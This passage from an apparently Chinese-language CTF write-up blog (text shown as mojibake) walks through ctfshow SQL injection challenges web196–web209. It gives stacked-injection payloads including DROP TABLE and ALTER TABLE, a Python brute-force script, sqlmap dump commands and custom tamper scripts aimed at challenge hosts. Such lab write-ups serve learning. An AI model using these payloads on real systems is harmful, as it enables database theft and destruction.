è‡³äºä¸ºä»€ä¹ˆéå¾—ç”¨åå…­è¿›åˆ¶ç™»å½•ï¼Œæ˜¯å› ä¸ºä¸‹é¢è¿™ä¸ªæ²¡æœ‰å­—ç¬¦ä¸²å•å¼•å·åŒ…å›´</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = &#123;$username&#125;;"</span><span class="token punctuation">;</span></code></pre><h4 id="web196-select-row-0"><a href="#web196-select-row-0" class="headerlink" title="web196(select row[0])"></a>web196(select row[0])</h4><p>è¿™é“é¢˜ç›®çš„selectè™½ç„¶å†™çš„æ˜¯è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å®é™…å¹¶æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ï¼ˆæ ¹æ®ç¾¤é‡Œçš„åé¦ˆï¼Œè¯´ç¾¤ä¸»æœ¬æ¥æ˜¯æ‰“ç®—æŠŠè¿‡æ»¤selectå†™æˆse1ectï¼Œä½†æ˜¯</p><p>å¿˜è®°æ”¹äº†ã€‚ä¸è¿‡se1ectä¹Ÿå¹¶æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ„Ÿè§‰çº¯ç²¹å°±æ˜¯æ²¡æœ‰åŠ selectçš„è¿‡æ»¤ï½ï¼‰</p><p>å¯ä»¥ç”¨selectç»•è¿‡passwordçš„ifåˆ¤æ–­ã€‚</p><p>åˆ¤æ–­æ¡ä»¶æ»¡è¶³çš„è®¾å®šæ˜¯<code>$row[0]==$password</code>ï¼Œ$rowå­˜å‚¨çš„æ˜¯ç»“æœé›†ä¸­çš„ä¸€è¡Œæ•°æ®ï¼Œ$row[0]å°±æ˜¯è¿™ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªæ•°æ®ã€‚æ—¢ç„¶å¯ä»¥å †å æ³¨</p><p>å…¥ï¼Œå°±æ˜¯å¯ä»¥å¤šè¯­å¥æŸ¥è¯¢ï¼Œ$rowåº”è¯¥ä¹Ÿä¼šé€ä¸€å¾ªç¯è·å–æ¯ä¸ªç»“æœé›†ã€‚</p><p>é‚£ä¹ˆå¯ä»¥è¾“å…¥usernameä¸º<code>1;select(9)</code>ï¼Œpasswordä¸º9ã€‚å½“$rowè·å–åˆ°ç¬¬äºŒä¸ªæŸ¥è¯¢è¯­å¥select(9)çš„ç»“æœé›†æ—¶ï¼Œå³å¯è·å¾—$row[0]&#x3D;9ï¼Œé‚£</p><p>ä¹ˆpasswordè¾“å…¥9å°±å¯ä»¥æ»¡è¶³æ¡ä»¶åˆ¤æ–­ã€‚åŒæ ·è¾“å…¥å…¶ä»–å¯†ç ä¹Ÿå¯ä»¥</p><h4 id="web197-alertä¿®æ”¹å­—æ®µ-show-tables-drop"><a href="#web197-alertä¿®æ”¹å­—æ®µ-show-tables-drop" class="headerlink" title="web197(alertä¿®æ”¹å­—æ®µ  show tables  drop)"></a>web197(alertä¿®æ”¹å­—æ®µ  show tables  drop)</h4><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"ç™»é™†æˆåŠŸ flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>è¿™æ¬¡selectè¢«banäº†</p><p><strong>æ–¹æ³•ä¸€</strong></p><p>åˆ©ç”¨<code>show</code>ã€‚æ ¹æ®é¢˜ç›®ç»™çš„æŸ¥è¯¢è¯­å¥ï¼Œå¯ä»¥çŸ¥é“æ•°æ®åº“çš„è¡¨åä¸ºctfshow_userï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡<code>show tables</code>ï¼Œè·å–è¡¨åçš„ç»“æœé›†ï¼Œåœ¨è¿™ä¸ª</p><p>ç»“æœé›†é‡Œå®šç„¶æœ‰ä¸€è¡Œçš„æ•°æ®ä¸ºctfshow_userã€‚</p><p>ç”¨æˆ·åï¼š<code>1;show tables</code></p><p>å¯†ç ï¼š<code>ctfshow_user</code></p><p><strong>æ–¹æ³•äºŒ</strong></p><p>å¯ä»¥åˆ©ç”¨<code>alter</code>ä¿®æ”¹å­—æ®µåï¼ŒæŠŠ<code>id</code>å’Œ<code>pass</code>å¯¹è°ƒï¼Œç„¶åçˆ†ç ´idã€‚</p><p><strong>ALTER TABLE</strong> è¯­å¥ç”¨äºåœ¨å·²æœ‰çš„è¡¨ä¸­æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤åˆ—ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change column &#96;pass&#96; &#96;a&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;a&#96; &#96;id&#96; varchar(255)</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1a4c8604-7c24-4000-a07a-b9c23f8c0ca3.challenge.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>  <span class="token comment"># 0</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"ç™»é™†æˆåŠŸ"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+]id </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> is right"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><strong>æ–¹æ³•ä¸‰</strong></p><p>æ›´æ–°è¡¨ã€‚è¿‡æ»¤äº†updateï¼Œä½†æˆ‘ä»¬å¯ä»¥åˆ è¡¨ï¼Œé‡æ–°å»ºä¸€ä¸ªåŒæ ·è¡¨åçš„è¡¨ï¼Œåˆ—åç»™çš„æŸ¥è¯¢è¯­å¥ä¹Ÿå·²ç»å‘ŠçŸ¥ï¼Œåˆ†åˆ«æ˜¯usernameå’Œpassã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;drop table ctfshow_user;create table ctfshow_user(&#96;username&#96; varchar(100),&#96;pass&#96; varchar(100));insert ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(1,1)</code></pre><p>è¿™é‡Œçš„æ„æ€å°±æ˜¯åˆ é™¤ä»¥å‰çš„è¡¨ï¼Œå†è‡ªå·±æ–°å»ºä¸€ä¸ªå¹¶ä¸”æ’å…¥æ•°æ®ï¼šusername&#x3D;1ï¼Œpass&#x3D;1</p><p>ç„¶åç›´æ¥è¾“å…¥1ä¸ºç”¨æˆ·åå’Œå¯†ç ï¼Œç™»å½•å³å¯å¾—åˆ°flagã€‚</p><h4 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h4><p>è¿‡æ»¤äº†<code>create</code> <code>drop</code>ï¼Œä½†å¯ä»¥ç”¨å…¶ä»–æ–¹æ³•</p><h4 id="wen199"><a href="#wen199" class="headerlink" title="wen199"></a>wen199</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><strong>æ–¹æ³•ä¸€</strong>ï¼šæœ¬é¢˜ä¾ç„¶å¯ä»¥ä½¿ç”¨<code>show tables</code>ã€‚</p><p><strong>æ–¹æ³•äºŒ</strong>ï¼šæœ¬é¢˜è¿‡æ»¤äº†æ‹¬å·ï¼Œé™åˆ¶äº†ä¹‹å‰payloadä¸­çš„varchar(100)ï¼Œå¯ä»¥æ”¹ä¸ºtextã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change &#96;pass&#96; &#96;tmp&#96; text;alter table ctfshow_user change &#96;username&#96; &#96;pass&#96; text;alter table ctfshow_user change &#96;tmp&#96; &#96;username&#96; text;</code></pre><h4 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h4><p>å¢åŠ äº†é€—å·çš„è¿‡æ»¤ï¼Œä¸å½±å“ã€‚web199çš„ä¸¤ä¸ªæ–¹æ³•éƒ½å¯ä»¥ç”¨ã€‚</p><h4 id="web201-Sqlmap-â€“referer"><a href="#web201-Sqlmap-â€“referer" class="headerlink" title="web201(Sqlmap â€“referer)"></a>web201(Sqlmap â€“referer)</h4><p><a href="https://sqlmap.highlight.ink/"><a href="https://sqlmap.highlight.ink/">sqlmap ç”¨æˆ·æ‰‹å†Œ</a></a></p><p>SQLmapä½¿ç”¨é¡ºåºï¼š</p><ol><li>è·å–å½“å‰MySQLä¸­çš„æ‰€æœ‰æ•°æ®åº“<code>sqlmap -u http://xxx</code></li><li>è·å–å½“å‰æ•°æ®åº“åå­—</li><li>è·å–æ•°æ®åº“ä¸‹çš„æ•°æ®è¡¨</li><li>è·å–è¡¨ä¸‹çš„åˆ—å</li><li>å¯¼å‡ºæ•°æ®</li></ol><p><img src="web201.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_43621629/article/details/104515866">Sqlmap æ€§èƒ½ä¼˜åŒ–</a></p><p>è®¾ç½®å¤šçº¿ç¨‹</p><pre class="language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://127.0.0.1/sqli/Less-1/?id=1"</span> <span class="token parameter variable">--threads</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--banner</span> <span class="token parameter variable">-v</span> <span class="token number">5</span></code></pre><p>è¦æ·»åŠ ä¸€ä¸ªrefererå¤´</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥æ•°æ®åº“ï¼špython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -dbs</code></pre><p><img src="web201_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥è¡¨åï¼špython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables</code></pre><p><img src="web201_3.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥åˆ—åï¼špython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</code></pre><p><img src="web201_4.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥Flagï¼špython sqlmap.py -u &quot;https:&#x2F;&#x2F;9c35c10b-b7d4-45d6-b7a1-9edc4248e8c2.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><p><img src="web201_5.png" loading="lazy"></p><h4 id="web202-â€“data"><a href="#web202-â€“data" class="headerlink" title="web202(â€“data)"></a>web202(â€“data)</h4><p>â€“data&#x3D;DATA         è¯¥å‚æ•°æŒ‡å®šçš„æ•°æ®ä¼šè¢«ä½œä¸ºPOSTæ•°æ®æäº¤</p><p>ä½¿ç”¨postæ–¹å¼è¿›è¡Œæ³¨å…¥ï¼Œå¯ä»¥ç›´æ¥ç”¨<code>--data=&quot;id=1&quot;</code>ï¼Œä¹Ÿå¯ä»¥<code>--method=post</code>æ¥è§¦å‘</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1.ä½¿ç”¨dataè°ƒæ•´å‚æ•°python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot;2.æŸ¥åº“python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbs3.æŸ¥è¡¨python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web --tables4.æŸ¥åˆ—python sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user --columns5.æŸ¥Flagpython sqlmap.py -u &quot;https:&#x2F;&#x2F;a7352dd5-2c20-40e5-bef5-6aaa79676dcc.challenge.ctf.show&#x2F;api&#x2F;&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web203-â€“method-PUT"><a href="#web203-â€“method-PUT" class="headerlink" title="web203(â€“method&#x3D;PUT)"></a>web203(â€“method&#x3D;PUT)</h4><p><strong>HTTP <code>PUT</code> è¯·æ±‚æ–¹æ³•</strong>åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºæˆ–ç”¨è¯·æ±‚çš„æœ‰æ•ˆè½½è·æ›¿æ¢ç›®æ ‡èµ„æºçš„è¡¨ç¤ºã€‚</p><p><code>PUT</code> ä¸ <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> æ–¹æ³•çš„åŒºåˆ«æ˜¯ï¼Œ<code>PUT</code> æ–¹æ³•æ˜¯å¹‚ç­‰çš„ï¼šè°ƒç”¨ä¸€æ¬¡ä¸è¿ç»­è°ƒç”¨å¤šæ¬¡æ•ˆæœæ˜¯ç›¸åŒçš„ï¼ˆå³æ²¡æœ‰<em>å‰¯</em>ä½œç”¨ï¼‰ï¼Œè€Œè¿ç»­è°ƒç”¨å¤šæ¬¡ç›¸åŒçš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> æ–¹æ³•å¯èƒ½ä¼šæœ‰å‰¯ä½œç”¨ï¼Œæ¯”å¦‚å¤šæ¬¡æäº¤åŒä¸€è®¢å•ã€‚</p><p>æŒ‡å®š<code>--method=PUT</code>æ–¹æ³•ï¼ŒåŒæ—¶**åŠ ä¸Š<code>--headers=&quot;Content-Type:text/plain</code>**ï¼Œå¦åˆ™putæ¥å—ä¸äº†ã€‚åŒæ—¶ï¼Œè¦åŠ ä¸Šindex.phpï¼Œ<code>url/api/index.php</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;6792f785-47eb-4ea4-b098-0123488759c4.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web204-â€“cookie"><a href="#web204-â€“cookie" class="headerlink" title="web204(â€“cookie)"></a>web204(â€“cookie)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; -D ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;87742487-acec-4728-91da-8113d95b32cf.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;9tgbnd43m59t71te1u80d66pjs; ctfshow&#x3D;8c61071229d48923c7ced01b20ec493e&quot; --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql dbs&#x3D;ctfshow_web -T ctfshow_user -C &quot;id,pass,username&quot; --dump</code></pre><h4 id="web205-apiæƒé™"><a href="#web205-apiæƒé™" class="headerlink" title="web205(apiæƒé™)"></a>web205(apiæƒé™)</h4><p>apiè°ƒç”¨éœ€è¦é‰´æƒ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">--</span>safe<span class="token operator">-</span>url è®¾ç½®åœ¨æµ‹è¯•ç›®æ ‡åœ°å€å‰è®¿é—®çš„å®‰å…¨é“¾æ¥<span class="token operator">--</span>safe<span class="token operator">-</span>freq è®¾ç½®ä¸¤æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°</code></pre><p>é€šè¿‡F12ä¸­networkæŠ“åŒ…å¯ä»¥çœ‹è§ï¼Œæœ‰ä¸€ä¸ª<code>getToken.php</code>çš„è¯·æ±‚tokençš„åŠ¨ä½œï¼›</p><p><img src="web205.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;bllqt44686hm6msc9ti5ruevpb&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a530a88b-1bce-49ce-bfee-18b37febf906.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flax -C flagx --dump</code></pre><p>è¿™ä¸ªé¢˜æ¢äº†è¡¨åå’Œåˆ—å</p><h4 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h4><p>sqléœ€è¦é—­åˆï¼Œsqlmapä¼šè‡ªåŠ¨é—­åˆï¼ŒPayloadåŒä¸Š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;3ehcblk49o3nqd3hp3nqsdr0ga&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;34b88ba2-58d2-4a8c-9b6f-3b1b0e663a27.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --data&#x3D;&quot;id&#x3D;1&quot; --dbms&#x3D;mysql -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</code></pre><h4 id="web207-â€“tamper"><a href="#web207-â€“tamper" class="headerlink" title="web207(â€“tamper)"></a>web207(â€“tamper)</h4><p><a href="https://y4er.com/posts/sqlmap-tamper/">Sqlmap Tamper ç¼–å†™</a></p><p><code>--batch</code>ä½¿ç”¨é»˜è®¤çš„é€‰é¡¹è¿›è¡Œæ³¨å…¥ï¼Œæ— éœ€ç”¨æˆ·è¾“å…¥å’Œäº¤äº’<br><code>--prefix=PREFIX</code>æŒ‡å®špayloadçš„å‰ç¼€<br><code>--suffix=SUFFIX</code>æŒ‡å®špayloadçš„åç¼€</p><p>é¢˜ç›®å¯¹ç©ºæ ¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨space2comment.pyè¿™ä¸ªè„šæœ¬ï¼Œå°†ç©ºæ ¼è½¬æ¢æˆæ³¨é‡Šç¬¦æ¥ç»•è¿‡</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h4><p>å¯¹å°å†™çš„<code>select</code>å’Œç©ºæ ¼è¿›è¡Œäº†ç»•è¿‡ï¼Œä¸è¿‡sqlmapä¸­çš„selectéƒ½æ˜¯å¤§å†™çš„</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> os<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>common <span class="token keyword">import</span> singleTimeWarnMessage<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> DBMS<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>HIGHEST<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span> <span class="token string">"select"</span><span class="token punctuation">)</span><span class="token comment">#å°±ä¿®æ”¹è¿™ä¸€è¡Œäº†</span>    <span class="token keyword">return</span> payload</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --referer&#x3D;&quot;ctf.show&quot; --method&#x3D;PUT --data&#x3D;&quot;id&#x3D;1&quot; --prefix&#x3D;&quot;&#39;)&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f1d1f0d1-9da8-4cf2-adfd-ff1d3a54a79f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --batch --tamper&#x3D;space2comment</code></pre><h4 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h4><p>è¿‡æ»¤äº†<code> </code>ï¼Œ<code>*</code>å·å’Œ<code>=</code>ï¼Œ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;d5249ee4-9520-4049-a7f0-d3cc15ccc88a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;1763p4504m3dcol5349rfgt5q9&quot; --tamper web209.py -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token 